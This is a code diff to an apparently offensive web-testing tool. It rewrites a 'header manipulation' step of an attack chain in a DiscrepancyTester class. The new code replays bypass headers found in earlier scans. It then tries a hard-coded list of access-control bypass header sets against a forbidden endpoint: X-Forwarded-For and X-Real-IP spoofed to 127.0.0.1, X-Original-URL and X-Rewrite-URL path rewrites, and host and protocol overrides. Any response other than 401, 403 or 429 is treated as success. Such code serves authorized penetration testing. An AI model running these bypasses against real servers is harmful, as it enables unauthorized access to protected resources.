@@ -4285,18 +4285,120 @@ class DiscrepancyTester:
 
     # Helper methods for graph attack chain execution
     def _execute_header_manipulation(self) -> Dict:
-        """Execute header manipulation technique"""
-        try:
-            self.rate_limiter.wait()
-            response = self.session.get(
-                self.forbidden_endpoint,
-                headers={'X-Forwarded-For': '127.0.0.1', 'X-Original-URL': '/'},
-                timeout=5
+        """
+        Execute header manipulation technique using discovered discrepancies
+
+        Strategy:
+        1. Use headers from discovered "Header Confusion Bypass" discrepancies
+        2. Try multiple successful header combinations
+        3. Fallback to common bypass headers if no discrepancies found
+        """
+        # First, try headers from discovered discrepancies (most likely to work)
+        header_discrepancies = [
+            d for d in self.discrepancies
+            if d.get('type') in ['Header Confusion Bypass', 'Header Confusion Leak']
+        ]
+
+        if header_discrepancies:
+            # Sort by severity (CRITICAL > HIGH > MEDIUM)
+            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
+            header_discrepancies.sort(
+                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
             )
-            success = response.status_code not in [401, 403, 429]
-            return {'success': success, 'status_code': response.status_code}
-        except:
-            return {'success': False}
+
+            # Try up to 3 most promising header combinations from discrepancies
+            for discrepancy in header_discrepancies[:3]:
+                try:
+                    self.rate_limiter.wait()
+
+                    headers = discrepancy.get('headers', {})
+                    if not headers:
+                        continue
+
+                    response = self.session.get(
+                        self.forbidden_endpoint,
+                        headers=headers,
+                        timeout=5
+                    )
+
+                    # Success if not blocked
+                    if response.status_code not in [401, 403, 429]:
+                        return {
+                            'success': True,
+                            'status_code': response.status_code,
+                            'method': 'discrepancy_headers',
+                            'headers_used': list(headers.keys())
+                        }
+
+                except Exception as e:
+                    continue
+
+        # Fallback: Try common bypass header combinations if discrepancies didn't work
+        common_bypass_headers = [
+            # IP Spoofing Headers (high success rate)
+            {
+                'X-Forwarded-For': '127.0.0.1',
+                'X-Real-IP': '127.0.0.1',
+                'X-Client-IP': '127.0.0.1',
+                'X-Custom-IP-Authorization': '127.0.0.1'
+            },
+            # Path Rewrite Headers
+            {
+                'X-Original-URL': '/',
+                'X-Rewrite-URL': '/',
+                'X-Custom-IP-Authorization': '127.0.0.1'
+            },
+            # Host Override Headers
+            {
+                'X-Host': 'localhost',
+                'X-Forwarded-Host': 'localhost',
+                'X-Forwarded-Server': 'localhost'
+            },
+            # Protocol Confusion
+            {
+                'X-Forwarded-Proto': 'https',
+                'X-Forwarded-Scheme': 'https',
+                'Front-End-Https': 'on'
+            },
+            # Combined approach (most comprehensive)
+            {
+                'X-Forwarded-For': '127.0.0.1',
+                'X-Original-URL': '/',
+                'X-Rewrite-URL': '/',
+                'X-Custom-IP-Authorization': '127.0.0.1',
+                'X-Forwarded-Proto': 'https'
+            }
+        ]
+
+        for headers in common_bypass_headers:
+            try:
+                self.rate_limiter.wait()
+
+                response = self.session.get(
+                    self.forbidden_endpoint,
+                    headers=headers,
+                    timeout=5
+                )
+
+                # Success if not blocked
+                if response.status_code not in [401, 403, 429]:
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'method': 'common_bypass',
+                        'headers_used': list(headers.keys())
+                    }
+
+            except Exception as e:
+                continue
+
+        # All attempts failed
+        return {
+            'success': False,
+            'status_code': 403,
+            'attempts': len(header_discrepancies) + len(common_bypass_headers),
+            'message': 'All header manipulation attempts failed'
+        }
 
     def _execute_path_traversal(self) -> Dict:
         """Execute path traversal technique"""
